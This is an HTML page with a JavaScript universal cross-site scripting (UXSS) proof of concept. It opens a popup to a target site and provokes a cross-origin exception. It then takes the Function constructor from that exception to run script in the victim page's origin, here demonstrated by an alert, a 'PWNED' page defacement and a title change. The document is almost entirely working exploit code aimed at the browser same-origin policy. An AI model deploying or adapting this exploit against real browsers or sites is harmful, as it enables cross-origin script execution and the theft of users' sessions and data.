<body style="background:#111;color:#0f0;font-family:monospace;">
<script>

// ==============================
// CONFIG
// ==============================
var TARGET_URL = "https://example.com";
var DELAY = 1500;

// ==============================
// UTILS
// ==============================
function log(msg) {
    console.log("[POC] " + msg);
}

function safeExec(fn) {
    try {
        fn();
    } catch (e) {
        log("Error: " + e);
    }
}

// ==============================
// STEP 1: OPEN TARGET WINDOW
// ==============================
function openTarget() {
    log("Opening target window...");
    var w = window.open(TARGET_URL);

    if (!w) {
        alert("Popup blocked!");
        return null;
    }

    return w;
}

// ==============================
// STEP 2: TRIGGER EXCEPTION
// ==============================
function triggerException(victim) {
    log("Triggering cross-origin exception...");

    try {
        // Force exception via cross-origin call
        location.assign.call(victim.location);
    } catch (e) {
        log("Exception captured ✔");
        return e;
    }

    log("No exception ❌");
    return null;
}

// ==============================
// STEP 3: EXTRACT FUNCTION
// ==============================
function extractFunction(exceptionObject) {
    log("Extracting Function constructor...");

    try {
        var func = exceptionObject.constructor.constructor;
        log("Function extracted ✔");
        return func;
    } catch (err) {
        log("Extraction failed ❌");
        return null;
    }
}

// ==============================
// STEP 4: EXECUTE PAYLOAD
// ==============================
function executePayload(func) {
    log("Executing payload in victim context...");

    safeExec(function() {
        func(`
            alert("UXSS SUCCESS\\nOrigin: " + location.origin);

            document.body.innerHTML = "<h1 style='color:red'>PWNED</h1>";

            document.title = "Owned by UXSS";

            console.log("Executed inside:", location.href);
        `)();
    });
}

// ==============================
// MAIN FLOW
// ==============================
function runPoC() {
    log("Starting PoC...");

    var victim = openTarget();
    if (!victim) return;

    setTimeout(function() {

        var ex = triggerException(victim);
        if (!ex) return;

        var func = extractFunction(ex);
        if (!func) return;

        executePayload(func);

    }, DELAY);
}

// ==============================
// START
// ==============================
runPoC();

</script>

<h2>UXSS PoC Running...</h2>
<p>Check popup & console output</p>

</body>
